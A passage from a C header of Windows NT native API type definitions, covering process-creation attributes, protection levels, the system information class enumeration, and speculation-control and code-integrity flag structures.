            ACCESS_MASK AdditionalFileAccess;
        } InitState;

        struct
        {
            HANDLE FileHandle;
        } FailSection;

        struct
        {
            USHORT DllCharacteristics;
        } ExeFormat;

        struct
        {
            HANDLE IFEOKey;
        } ExeName;

        struct
        {
            union
            {
                ULONG OutputFlags;
                struct
                {
                    UCHAR ProtectedProcess : 1;
                    UCHAR AddressSpaceOverride : 1;
                    UCHAR DevOverrideEnabled : 1;
                    UCHAR ManifestDetected : 1;
                    UCHAR ProtectedProcessLight : 1;
                    UCHAR SpareBits1 : 3;
                    UCHAR SpareBits2 : 8;
                    USHORT SpareBits3 : 16;
                };
            };
            HANDLE FileHandle;
            HANDLE SectionHandle;
            ULONGLONG UserProcessParametersNative;
            ULONG UserProcessParametersWow64;
            ULONG CurrentParameterFlags;
            ULONGLONG PebAddressNative;
            ULONG PebAddressWow64;
            ULONGLONG ManifestAddress;
            ULONG ManifestSize;
        } SuccessState;
    };
} PS_CREATE_INFO, *PPS_CREATE_INFO;

typedef struct _PS_ATTRIBUTE {
    ULONG Attribute;
    SIZE_T Size;
    union
    {
        ULONG Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

typedef enum _PS_PROTECTED_TYPE {
    PsProtectedTypeNone,
    PsProtectedTypeProtectedLight,
    PsProtectedTypeProtected,
    PsProtectedTypeMax
} PS_PROTECTED_TYPE;

typedef enum _PS_PROTECTED_SIGNER {
    PsProtectedSignerNone,
    PsProtectedSignerAuthenticode,
    PsProtectedSignerCodeGen,
    PsProtectedSignerAntimalware,
    PsProtectedSignerLsa,
    PsProtectedSignerWindows,
    PsProtectedSignerWinTcb,
    PsProtectedSignerWinSystem,
    PsProtectedSignerApp,
    PsProtectedSignerMax
} PS_PROTECTED_SIGNER;

#define PS_PROTECTED_SIGNER_MASK 0xFF
#define PS_PROTECTED_AUDIT_MASK 0x08
#define PS_PROTECTED_TYPE_MASK 0x07

// from ph2
#define PsProtectedValue(aSigner, aAudit, aType) ( \
    (((aSigner) & PS_PROTECTED_SIGNER_MASK) << 4) | \
    (((aAudit) & PS_PROTECTED_AUDIT_MASK) << 3) | \
    ((aType) & PS_PROTECTED_TYPE_MASK)\
    )

#define InitializePsProtection(aProtectionLevelPtr, aSigner, aAudit, aType) { \
    (aProtectionLevelPtr)->Signer = aSigner; \
    (aProtectionLevelPtr)->Audit = aAudit; \
    (aProtectionLevelPtr)->Type = aType; \
    }

typedef struct _PS_PROTECTION {
    union
    {
        UCHAR Level;
        struct
        {
            UCHAR Type : 3;
            UCHAR Audit : 1;
            UCHAR Signer : 4;
        };
    };
} PS_PROTECTION, *PPS_PROTECTION;

// begin_rev
#define PS_ATTRIBUTE_NUMBER_MASK 0x0000ffff
#define PS_ATTRIBUTE_THREAD 0x00010000 
#define PS_ATTRIBUTE_INPUT 0x00020000 
#define PS_ATTRIBUTE_ADDITIVE 0x00040000 
// end_rev

typedef enum _PS_ATTRIBUTE_NUM {
    PsAttributeParentProcess,
    PsAttributeDebugPort,
    PsAttributeToken,
    PsAttributeClientId,
    PsAttributeTebAddress,
    PsAttributeImageName,
    PsAttributeImageInfo,
    PsAttributeMemoryReserve,
    PsAttributePriorityClass,
    PsAttributeErrorMode,
    PsAttributeStdHandleInfo,
    PsAttributeHandleList,
    PsAttributeGroupAffinity,
    PsAttributePreferredNode,
    PsAttributeIdealProcessor,
    PsAttributeUmsThread,
    PsAttributeMitigationOptions,
    PsAttributeProtectionLevel,
    PsAttributeSecureProcess,
    PsAttributeJobList,
    PsAttributeChildProcessPolicy,
    PsAttributeAllApplicationPackagesPolicy,
    PsAttributeWin32kFilter,
    PsAttributeSafeOpenPromptOriginClaim,
    PsAttributeBnoIsolation,
    PsAttributeDesktopAppPolicy,
    PsAttributeChpe,
    PsAttributeMitigationAuditOptions,
    PsAttributeMachineType,
    PsAttributeComponentFilter,
    PsAttributeEnableOptionalXStateFeatures,
    PsAttributeSupportedMachines,
    PsAttributeSveVectorLength,
    PsAttributeMax
} PS_ATTRIBUTE_NUM;

#define PsAttributeValue(Number, Thread, Input, Unknown) \
    (((Number) & PS_ATTRIBUTE_NUMBER_MASK) | \
    ((Thread) ? PS_ATTRIBUTE_THREAD : 0) | \
    ((Input) ? PS_ATTRIBUTE_INPUT : 0) | \
    ((Unknown) ? PS_ATTRIBUTE_ADDITIVE : 0))

#define PS_ATTRIBUTE_PARENT_PROCESS \
    PsAttributeValue(PsAttributeParentProcess, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_DEBUG_OBJECT \
    PsAttributeValue(PsAttributeDebugObject, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_TOKEN \
    PsAttributeValue(PsAttributeToken, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_CLIENT_ID \
    PsAttributeValue(PsAttributeClientId, TRUE, FALSE, FALSE)
#define PS_ATTRIBUTE_TEB_ADDRESS \
    PsAttributeValue(PsAttributeTebAddress, TRUE, FALSE, FALSE)
#define PS_ATTRIBUTE_IMAGE_NAME \
    PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_IMAGE_INFO \
    PsAttributeValue(PsAttributeImageInfo, FALSE, FALSE, FALSE)
#define PS_ATTRIBUTE_MEMORY_RESERVE \
    PsAttributeValue(PsAttributeMemoryReserve, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_PRIORITY_CLASS \
    PsAttributeValue(PsAttributePriorityClass, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_ERROR_MODE \
    PsAttributeValue(PsAttributeErrorMode, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_STD_HANDLE_INFO \
    PsAttributeValue(PsAttributeStdHandleInfo, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_HANDLE_LIST \
    PsAttributeValue(PsAttributeHandleList, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_GROUP_AFFINITY \
    PsAttributeValue(PsAttributeGroupAffinity, TRUE, TRUE, FALSE)
#define PS_ATTRIBUTE_PREFERRED_NODE \
    PsAttributeValue(PsAttributePreferredNode, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_IDEAL_PROCESSOR \
    PsAttributeValue(PsAttributeIdealProcessor, TRUE, TRUE, FALSE)
#define PS_ATTRIBUTE_UMS_THREAD \
    PsAttributeValue(PsAttributeUmsThread, TRUE, TRUE, FALSE)
#define PS_ATTRIBUTE_MITIGATION_OPTIONS \
    PsAttributeValue(PsAttributeMitigationOptions, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_PROTECTION_LEVEL \
    PsAttributeValue(PsAttributeProtectionLevel, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_SECURE_PROCESS \
    PsAttributeValue(PsAttributeSecureProcess, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_JOB_LIST \
    PsAttributeValue(PsAttributeJobList, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_CHILD_PROCESS_POLICY \
    PsAttributeValue(PsAttributeChildProcessPolicy, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_ALL_APPLICATION_PACKAGES_POLICY \
    PsAttributeValue(PsAttributeAllApplicationPackagesPolicy, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_WIN32K_FILTER \
    PsAttributeValue(PsAttributeWin32kFilter, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_SAFE_OPEN_PROMPT_ORIGIN_CLAIM \
    PsAttributeValue(PsAttributeSafeOpenPromptOriginClaim, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_BNO_ISOLATION \
    PsAttributeValue(PsAttributeBnoIsolation, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_DESKTOP_APP_POLICY \
    PsAttributeValue(PsAttributeDesktopAppPolicy, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_CHPE \
    PsAttributeValue(PsAttributeChpe, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_MITIGATION_AUDIT_OPTIONS \
    PsAttributeValue(PsAttributeMitigationAuditOptions, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_MACHINE_TYPE \
    PsAttributeValue(PsAttributeMachineType, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_COMPONENT_FILTER \
    PsAttributeValue(PsAttributeComponentFilter, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_ENABLE_OPTIONAL_XSTATE_FEATURES \
    PsAttributeValue(PsAttributeEnableOptionalXStateFeatures, TRUE, TRUE, FALSE)

#define RTL_USER_PROC_PARAMS_NORMALIZED                 0x00000001
#define RTL_USER_PROC_PROFILE_USER                      0x00000002
#define RTL_USER_PROC_PROFILE_KERNEL                    0x00000004
#define RTL_USER_PROC_PROFILE_SERVER                    0x00000008
#define RTL_USER_PROC_RESERVE_1MB                       0x00000020
#define RTL_USER_PROC_RESERVE_16MB                      0x00000040
#define RTL_USER_PROC_CASE_SENSITIVE                    0x00000080
#define RTL_USER_PROC_DISABLE_HEAP_DECOMMIT             0x00000100
#define RTL_USER_PROC_DLL_REDIRECTION_LOCAL             0x00001000
#define RTL_USER_PROC_APP_MANIFEST_PRESENT              0x00002000
#define RTL_USER_PROC_IMAGE_KEY_MISSING                 0x00004000
#define RTL_USER_PROC_DEV_OVERRIDE_ENABLED              0x00008000
#define RTL_USER_PROC_OPTIN_PROCESS                     0x00020000
#define RTL_USER_PROC_SESSION_OWNER                     0x00040000
#define RTL_USER_PROC_HANDLE_USER_CALLBACK_EXCEPTIONS   0x00080000
#define RTL_USER_PROC_PROTECTED_PROCESS                 0x00400000
#define RTL_USER_PROC_SECURE_PROCESS                    0x80000000

typedef struct _PROCESS_HANDLE_TRACING_ENABLE {
    ULONG Flags;
} PROCESS_HANDLE_TRACING_ENABLE, * PPROCESS_HANDLE_TRACING_ENABLE;

#define PROCESS_HANDLE_TRACING_MAX_SLOTS 0x20000

typedef struct _PROCESS_HANDLE_TRACING_ENABLE_EX {
    ULONG Flags;
    ULONG TotalSlots;
} PROCESS_HANDLE_TRACING_ENABLE_EX, * PPROCESS_HANDLE_TRACING_ENABLE_EX;

#define PROCESS_HANDLE_TRACING_MAX_STACKS 16

#define PROCESS_HANDLE_TRACE_TYPE_OPEN      1
#define PROCESS_HANDLE_TRACE_TYPE_CLOSE     2
#define PROCESS_HANDLE_TRACE_TYPE_BADREF    3

typedef struct _PROCESS_HANDLE_TRACING_ENTRY {
    HANDLE Handle;
    CLIENT_ID ClientId;
    ULONG Type;
    PVOID Stacks[PROCESS_HANDLE_TRACING_MAX_STACKS];
} PROCESS_HANDLE_TRACING_ENTRY, * PPROCESS_HANDLE_TRACING_ENTRY;

typedef struct _PROCESS_HANDLE_TRACING_QUERY {
    HANDLE Handle;
    ULONG TotalTraces;
    PROCESS_HANDLE_TRACING_ENTRY HandleTrace[1];
} PROCESS_HANDLE_TRACING_QUERY, * PPROCESS_HANDLE_TRACING_QUERY;

typedef struct _PROCESS_WS_WATCH_INFORMATION {
    PVOID FaultingPc;
    PVOID FaultingVa;
} PROCESS_WS_WATCH_INFORMATION, * PPROCESS_WS_WATCH_INFORMATION;

typedef struct _PROCESS_WS_WATCH_INFORMATION_EX {
    PROCESS_WS_WATCH_INFORMATION BasicInfo;
    ULONG_PTR FaultingThreadId;
    ULONG_PTR Flags;
} PROCESS_WS_WATCH_INFORMATION_EX, * PPROCESS_WS_WATCH_INFORMATION_EX;

typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION {
    ULONG Version;
    ULONG Reserved;
    PVOID Callback;
} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, * PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;

/*
** Processes END
*/

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemProcessorInformation = 1,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemPathInformation = 4,
    SystemProcessInformation = 5,
    SystemCallCountInformation = 6,
    SystemDeviceInformation = 7,
    SystemProcessorPerformanceInformation = 8,
    SystemFlagsInformation = 9,
    SystemCallTimeInformation = 10,
    SystemModuleInformation = 11,
    SystemLocksInformation = 12,
    SystemStackTraceInformation = 13,
    SystemPagedPoolInformation = 14,
    SystemNonPagedPoolInformation = 15,
    SystemHandleInformation = 16,
    SystemObjectInformation = 17,
    SystemPageFileInformation = 18,
    SystemVdmInstemulInformation = 19,
    SystemVdmBopInformation = 20,
    SystemFileCacheInformation = 21,
    SystemPoolTagInformation = 22,
    SystemInterruptInformation = 23,
    SystemDpcBehaviorInformation = 24,
    SystemFullMemoryInformation = 25,
    SystemLoadGdiDriverInformation = 26,
    SystemUnloadGdiDriverInformation = 27,
    SystemTimeAdjustmentInformation = 28,
    SystemSummaryMemoryInformation = 29,
    SystemMirrorMemoryInformation = 30,
    SystemPerformanceTraceInformation = 31,
    SystemObsolete0 = 32,
    SystemExceptionInformation = 33,
    SystemCrashDumpStateInformation = 34,
    SystemKernelDebuggerInformation = 35,
    SystemContextSwitchInformation = 36,
    SystemRegistryQuotaInformation = 37,
    SystemExtendServiceTableInformation = 38,
    SystemPrioritySeperation = 39,
    SystemVerifierAddDriverInformation = 40,
    SystemVerifierRemoveDriverInformation = 41,
    SystemProcessorIdleInformation = 42,
    SystemLegacyDriverInformation = 43,
    SystemCurrentTimeZoneInformation = 44,
    SystemLookasideInformation = 45,
    SystemTimeSlipNotification = 46,
    SystemSessionCreate = 47,
    SystemSessionDetach = 48,
    SystemSessionInformation = 49,
    SystemRangeStartInformation = 50,
    SystemVerifierInformation = 51,
    SystemVerifierThunkExtend = 52,
    SystemSessionProcessInformation = 53,
    SystemLoadGdiDriverInSystemSpace = 54,
    SystemNumaProcessorMap = 55,
    SystemPrefetcherInformation = 56,
    SystemExtendedProcessInformation = 57,
    SystemRecommendedSharedDataAlignment = 58,
    SystemComPlusPackage = 59,
    SystemNumaAvailableMemory = 60,
    SystemProcessorPowerInformation = 61,
    SystemEmulationBasicInformation = 62,
    SystemEmulationProcessorInformation = 63,
    SystemExtendedHandleInformation = 64,
    SystemLostDelayedWriteInformation = 65,
    SystemBigPoolInformation = 66,
    SystemSessionPoolTagInformation = 67,
    SystemSessionMappedViewInformation = 68,
    SystemHotpatchInformation = 69,
    SystemObjectSecurityMode = 70,
    SystemWatchdogTimerHandler = 71,
    SystemWatchdogTimerInformation = 72,
    SystemLogicalProcessorInformation = 73,
    SystemWow64SharedInformationObsolete = 74,
    SystemRegisterFirmwareTableInformationHandler = 75,
    SystemFirmwareTableInformation = 76,
    SystemModuleInformationEx = 77,
    SystemVerifierTriageInformation = 78,
    SystemSuperfetchInformation = 79,
    SystemMemoryListInformation = 80,
    SystemFileCacheInformationEx = 81,
    SystemThreadPriorityClientIdInformation = 82,
    SystemProcessorIdleCycleTimeInformation = 83,
    SystemVerifierCancellationInformation = 84,
    SystemProcessorPowerInformationEx = 85,
    SystemRefTraceInformation = 86,
    SystemSpecialPoolInformation = 87,
    SystemProcessIdInformation = 88,
    SystemErrorPortInformation = 89,
    SystemBootEnvironmentInformation = 90,
    SystemHypervisorInformation = 91,
    SystemVerifierInformationEx = 92,
    SystemTimeZoneInformation = 93,
    SystemImageFileExecutionOptionsInformation = 94,
    SystemCoverageInformation = 95,
    SystemPrefetchPatchInformation = 96,
    SystemVerifierFaultsInformation = 97,
    SystemSystemPartitionInformation = 98,
    SystemSystemDiskInformation = 99,
    SystemProcessorPerformanceDistribution = 100,
    SystemNumaProximityNodeInformation = 101,
    SystemDynamicTimeZoneInformation = 102,
    SystemCodeIntegrityInformation = 103,
    SystemProcessorMicrocodeUpdateInformation = 104,
    SystemProcessorBrandString = 105,
    SystemVirtualAddressInformation = 106,
    SystemLogicalProcessorAndGroupInformation = 107,
    SystemProcessorCycleTimeInformation = 108,
    SystemStoreInformation = 109,
    SystemRegistryAppendString = 110,
    SystemAitSamplingValue = 111,
    SystemVhdBootInformation = 112,
    SystemCpuQuotaInformation = 113,
    SystemNativeBasicInformation = 114,
    SystemErrorPortTimeouts = 115,
    SystemLowPriorityIoInformation = 116,
    SystemBootEntropyInformation = 117,
    SystemVerifierCountersInformation = 118,
    SystemPagedPoolInformationEx = 119,
    SystemSystemPtesInformationEx = 120,
    SystemNodeDistanceInformation = 121,
    SystemAcpiAuditInformation = 122,
    SystemBasicPerformanceInformation = 123,
    SystemQueryPerformanceCounterInformation = 124,
    SystemSessionBigPoolInformation = 125,
    SystemBootGraphicsInformation = 126,
    SystemScrubPhysicalMemoryInformation = 127,
    SystemBadPageInformation = 128,
    SystemProcessorProfileControlArea = 129,
    SystemCombinePhysicalMemoryInformation = 130,
    SystemEntropyInterruptTimingInformation = 131,
    SystemConsoleInformation = 132,
    SystemPlatformBinaryInformation = 133,
    SystemPolicyInformation = 134,
    SystemHypervisorProcessorCountInformation = 135,
    SystemDeviceDataInformation = 136,
    SystemDeviceDataEnumerationInformation = 137,
    SystemMemoryTopologyInformation = 138,
    SystemMemoryChannelInformation = 139,
    SystemBootLogoInformation = 140,
    SystemProcessorPerformanceInformationEx = 141,
    SystemSpare0 = 142,
    SystemSecureBootPolicyInformation = 143,
    SystemPageFileInformationEx = 144,
    SystemSecureBootInformation = 145,
    SystemEntropyInterruptTimingRawInformation = 146,
    SystemPortableWorkspaceEfiLauncherInformation = 147,
    SystemFullProcessInformation = 148,
    SystemKernelDebuggerInformationEx = 149,
    SystemBootMetadataInformation = 150,
    SystemSoftRebootInformation = 151,
    SystemElamCertificateInformation = 152,
    SystemOfflineDumpConfigInformation = 153,
    SystemProcessorFeaturesInformation = 154,
    SystemRegistryReconciliationInformation = 155,
    SystemEdidInformation = 156,
    SystemManufacturingInformation = 157,
    SystemEnergyEstimationConfigInformation = 158,
    SystemHypervisorDetailInformation = 159,
    SystemProcessorCycleStatsInformation = 160,
    SystemVmGenerationCountInformation = 161,
    SystemTrustedPlatformModuleInformation = 162,
    SystemKernelDebuggerFlags = 163,
    SystemCodeIntegrityPolicyInformation = 164,
    SystemIsolatedUserModeInformation = 165,
    SystemHardwareSecurityTestInterfaceResultsInformation = 166,
    SystemSingleModuleInformation = 167,
    SystemAllowedCpuSetsInformation = 168,
    SystemVsmProtectionInformation = 169, //ex SystemDmaProtectionInformation
    SystemInterruptCpuSetsInformation = 170,
    SystemSecureBootPolicyFullInformation = 171,
    SystemCodeIntegrityPolicyFullInformation = 172,
    SystemAffinitizedInterruptProcessorInformation = 173,
    SystemRootSiloInformation = 174,
    SystemCpuSetInformation = 175,
    SystemCpuSetTagInformation = 176,
    SystemWin32WerStartCallout = 177,
    SystemSecureKernelProfileInformation = 178,
    SystemCodeIntegrityPlatformManifestInformation = 179,
    SystemInterruptSteeringInformation = 180,
    SystemSupportedProcessorArchitectures = 181,
    SystemMemoryUsageInformation = 182,
    SystemCodeIntegrityCertificateInformation = 183,
    SystemPhysicalMemoryInformation = 184,
    SystemControlFlowTransition = 185,
    SystemKernelDebuggingAllowed = 186,
    SystemActivityModerationExeState = 187,
    SystemActivityModerationUserSettings = 188,
    SystemCodeIntegrityPoliciesFullInformation = 189,
    SystemCodeIntegrityUnlockInformation = 190,
    SystemIntegrityQuotaInformation = 191,
    SystemFlushInformation = 192,
    SystemProcessorIdleMaskInformation = 193,
    SystemSecureDumpEncryptionInformation = 194,
    SystemWriteConstraintInformation = 195,
    SystemKernelVaShadowInformation = 196,
    SystemHypervisorSharedPageInformation = 197,
    SystemFirmwareBootPerformanceInformation = 198,
    SystemCodeIntegrityVerificationInformation = 199,
    SystemFirmwarePartitionInformation = 200,
    SystemSpeculationControlInformation = 201,
    SystemDmaGuardPolicyInformation = 202,
    SystemEnclaveLaunchControlInformation = 203,
    SystemWorkloadAllowedCpuSetsInformation = 204,
    SystemCodeIntegrityUnlockModeInformation = 205,
    SystemLeapSecondInformation = 206,
    SystemFlags2Information = 207,
    SystemSecurityModelInformation = 208,
    SystemCodeIntegritySyntheticCacheInformation = 209,
    SystemFeatureConfigurationInformation = 210,
    SystemFeatureConfigurationSectionInformation = 211,
    SystemFeatureUsageSubscriptionInformation = 212,
    SystemSecureSpeculationControlInformation = 213,
    SystemSpacesBootInformation = 214,
    SystemFwRamdiskInformation = 215,
    SystemWheaIpmiHardwareInformation = 216,
    SystemDifSetRuleClassInformation = 217,
    SystemDifClearRuleClassInformation = 218,
    SystemDifApplyPluginVerificationOnDriver = 219,
    SystemDifRemovePluginVerificationOnDriver = 220,
    SystemShadowStackInformation = 221,
    SystemBuildVersionInformation = 222,
    SystemPoolLimitInformation = 223,
    SystemCodeIntegrityAddDynamicStore = 224,
    SystemCodeIntegrityClearDynamicStores = 225,
    SystemDifPoolTrackingInformation = 226,
    SystemPoolZeroingInformation = 227,
    SystemDpcWatchdogInformation = 228,
    SystemDpcWatchdogInformation2 = 229,
    SystemSupportedProcessorArchitectures2 = 230,
    SystemSingleProcessorRelationshipInformation = 231,
    SystemXfgCheckFailureInformation = 232,
    SystemIommuStateInformation = 233,
    SystemHypervisorMinrootInformation = 234,
    SystemHypervisorBootPagesInformation = 235,
    SystemPointerAuthInformation = 236,
    SystemSecureKernelDebuggerInformation = 237,
    SystemOriginalImageFeatureInformation = 238,
    SystemMemoryNumaInformation = 239,
    SystemMemoryNumaPerformanceInformation = 240,
    SystemCodeIntegritySignedPoliciesFullInformation = 241,
    SystemSecureSecretsInformation = 242,
    SystemTrustedAppsRuntimeInformation = 243,
    SystemBadPageInformationEx = 244,
    SystemResourceDeadlockTimeout = 245,
    SystemBreakOnContextUnwindFailureInformation = 246,
    SystemOslRamdiskInformation = 247,
    SystemCodeIntegrityPolicyManagementInformation = 248,
    SystemMemoryNumaCacheInformation = 249,
    SystemProcessorFeaturesBitMapInformation = 250,
    SystemRefTraceInformationEx = 251,
    SystemBasicProcessInformation = 252,
    SystemHandleCountInformation = 253,
    MaxSystemInfoClass
} SYSTEM_INFORMATION_CLASS, * PSYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_VSM_PROTECTION_INFORMATION {
    CHAR DmaProtectionsAvailable;
    CHAR DmaProtectionsInUse;
    CHAR HardwareMbecAvailable;
    CHAR ApicVirtualizationAvailable;
} SYSTEM_VSM_PROTECTION_INFORMATION, * PSYSTEM_VSM_PROTECTION_INFORMATION;

//msdn.microsoft.com/en-us/library/windows/desktop/ms724509(v=vs.85).aspx
typedef struct _SYSTEM_SPECULATION_CONTROL_INFORMATION {
    union {
        ULONG Flags;
        struct {
            ULONG BpbEnabled : 1;
            ULONG BpbDisabledSystemPolicy : 1;
            ULONG BpbDisabledNoHardwareSupport : 1;
            ULONG SpecCtrlEnumerated : 1;
            ULONG SpecCmdEnumerated : 1;
            ULONG IbrsPresent : 1;
            ULONG StibpPresent : 1;
            ULONG SmepPresent : 1;
            ULONG SpeculativeStoreBypassDisableAvailable : 1;
            ULONG SpeculativeStoreBypassDisableSupported : 1;
            ULONG SpeculativeStoreBypassDisabledSystemWide : 1;
            ULONG SpeculativeStoreBypassDisabledKernel : 1;
            ULONG SpeculativeStoreBypassDisableRequired : 1;
            ULONG BpbDisabledKernelToUser : 1;
            ULONG SpecCtrlRetpolineEnabled : 1;
            ULONG SpecCtrlImportOptimizationEnabled : 1;
            ULONG EnhancedIbrs : 1;
            ULONG HvL1tfStatusAvailable : 1;
            ULONG HvL1tfProcessorNotAffected : 1;
            ULONG HvL1tfMigitationEnabled : 1;
            ULONG HvL1tfMigitationNotEnabled_Hardware : 1;
            ULONG HvL1tfMigitationNotEnabled_LoadOption : 1;
            ULONG HvL1tfMigitationNotEnabled_CoreScheduler : 1;
            ULONG EnhancedIbrsReported : 1;
            ULONG MdsHardwareProtected : 1;
            ULONG MbClearEnabled : 1;
            ULONG MbClearReported : 1;
            ULONG TsxCtrlStatus : 2;
            ULONG TsxCtrlReported : 1;
            ULONG TaaHardwareImmune : 1;
            ULONG Reserved : 1;
        } SpeculationControlFlags;
    };
} SYSTEM_SPECULATION_CONTROL_INFORMATION, *PSYSTEM_SPECULATION_CONTROL_INFORMATION;

typedef struct _SYSTEM_SPECULATION_CONTROL_INFORMATION_V2 {
    union {
        ULONG Flags;
        struct {
            ULONG BpbEnabled : 1;
            ULONG BpbDisabledSystemPolicy : 1;
            ULONG BpbDisabledNoHardwareSupport : 1;
            ULONG SpecCtrlEnumerated : 1;
            ULONG SpecCmdEnumerated : 1;
            ULONG IbrsPresent : 1;
            ULONG StibpPresent : 1;
            ULONG SmepPresent : 1;
            ULONG SpeculativeStoreBypassDisableAvailable : 1;
            ULONG SpeculativeStoreBypassDisableSupported : 1;
            ULONG SpeculativeStoreBypassDisabledSystemWide : 1;
            ULONG SpeculativeStoreBypassDisabledKernel : 1;
            ULONG SpeculativeStoreBypassDisableRequired : 1;
            ULONG BpbDisabledKernelToUser : 1;
            ULONG SpecCtrlRetpolineEnabled : 1;
            ULONG SpecCtrlImportOptimizationEnabled : 1;
            ULONG EnhancedIbrs : 1;
            ULONG HvL1tfStatusAvailable : 1;
            ULONG HvL1tfProcessorNotAffected : 1;
            ULONG HvL1tfMigitationEnabled : 1;
            ULONG HvL1tfMigitationNotEnabled_Hardware : 1;
            ULONG HvL1tfMigitationNotEnabled_LoadOption : 1;
            ULONG HvL1tfMigitationNotEnabled_CoreScheduler : 1;
            ULONG EnhancedIbrsReported : 1;
            ULONG MdsHardwareProtected : 1;
            ULONG MbClearEnabled : 1;
            ULONG MbClearReported : 1;
            ULONG TsxCtrlStatus : 2;
            ULONG TsxCtrlReported : 1;
            ULONG TaaHardwareImmune : 1;
            ULONG Reserved : 1;
        } SpeculationControlFlags;
    };
    union {
        ULONG Flags2;
        struct {
            ULONG SbdrSsdpHardwareProtected : 1;
            ULONG FbsdpHardwareProtected : 1;
            ULONG PsdpHardwareProtected : 1;
            ULONG FbClearEnabled : 1;
            ULONG FbClearReported : 1;
            ULONG BhbEnabled : 1;
            ULONG BhbDisabledSystemPolicy : 1;
            ULONG BhbDisabledNoHardwareSupport : 1;
            ULONG BranchConfusionStatus : 2;
            ULONG BranchConfusionReported : 1;
            ULONG RdclHardwareProtectedReported : 1;
            ULONG RdclHardwareProtected : 1;
            ULONG Reserved3 : 4;
            ULONG Reserved4 : 3;
            ULONG DivideByZeroReported : 1;
            ULONG DivideByZeroStatus : 1;
            ULONG Reserved5 : 3;
            ULONG Reserved : 7;
        } SpeculationControlFlags2;
    };
} SYSTEM_SPECULATION_CONTROL_INFORMATION_V2, * PSYSTEM_SPECULATION_CONTROL_INFORMATION_V2;

typedef struct _SYSTEM_KERNEL_VA_SHADOW_INFORMATION {
    union {
        ULONG Flags;
        struct {
            ULONG KvaShadowEnabled : 1;
            ULONG KvaShadowUserGlobal : 1;
            ULONG KvaShadowPcid : 1;
            ULONG KvaShadowInvpcid : 1;
            ULONG KvaShadowRequired : 1;
            ULONG KvaShadowRequiredAvailable : 1;
            ULONG InvalidPteBit : 6;
            ULONG L1DataCacheFlushSupported : 1;
            ULONG L1TerminalFaultMitigationPresent : 1;
            ULONG Reserved : 18;
        } KvaShadowFlags;
    };
} SYSTEM_KERNEL_VA_SHADOW_INFORMATION, *PSYSTEM_KERNEL_VA_SHADOW_INFORMATION;

typedef struct _SYSTEM_CODEINTEGRITY_INFORMATION {
    ULONG  Length;
    ULONG  CodeIntegrityOptions;
} SYSTEM_CODEINTEGRITY_INFORMATION, *PSYSTEM_CODEINTEGRITY_INFORMATION;

#define CODEINTEGRITY_OPTION_ENABLED                      0x01
#define CODEINTEGRITY_OPTION_TESTSIGN                     0x02
#define CODEINTEGRITY_OPTION_UMCI_ENABLED                 0x04
#define CODEINTEGRITY_OPTION_UMCI_AUDITMODE_ENABLED       0x08
#define CODEINTEGRITY_OPTION_UMCI_EXCLUSIONPATHS_ENABLED  0x10
#define CODEINTEGRITY_OPTION_TEST_BUILD                   0x20
#define CODEINTEGRITY_OPTION_PREPRODUCTION_BUILD          0x40
#define CODEINTEGRITY_OPTION_DEBUGMODE_ENABLED            0x80
#define CODEINTEGRITY_OPTION_FLIGHT_BUILD                 0x100
#define CODEINTEGRITY_OPTION_FLIGHTING_ENABLED            0x200
#define CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED            0x400
#define CODEINTEGRITY_OPTION_HVCI_KMCI_AUDITMODE_ENABLED  0x800
#define CODEINTEGRITY_OPTION_HVCI_KMCI_STRICTMODE_ENABLED 0x1000
#define CODEINTEGRITY_OPTION_HVCI_IUM_ENABLED             0x2000
#define CODEINTEGRITY_OPTION_WHQL_ENFORCEMENT_ENABLED     0x4000
#define CODEINTEGRITY_OPTION_WHQL_AUDITMODE_ENABLED       0x8000

typedef struct _HV_DETAILS {
    ULONG Data[4];
} HV_DETAILS, * PHV_DETAILS;

typedef struct _HV_VENDOR_AND_MAX_FUNCTION {
    ULONG MaxFunction;
    CHAR VendorName[12];
} HV_VENDOR_AND_MAX_FUNCTION, * PHV_VENDOR_AND_MAX_FUNCTION;

typedef struct _SYSTEM_HYPERVISOR_DETAIL_INFORMATION {
    HV_DETAILS HvVendorAndMaxFunction;
    HV_DETAILS HypervisorInterface;
    HV_DETAILS HypervisorVersion;
    HV_DETAILS HvFeatures;
    HV_DETAILS HwFeatures;
    HV_DETAILS EnlightenmentInfo;
    HV_DETAILS ImplementationLimits;
} SYSTEM_HYPERVISOR_DETAIL_INFORMATION, * PSYSTEM_HYPERVISOR_DETAIL_INFORMATION;

typedef struct _SYSTEM_HYPERVISOR_QUERY_INFORMATION {
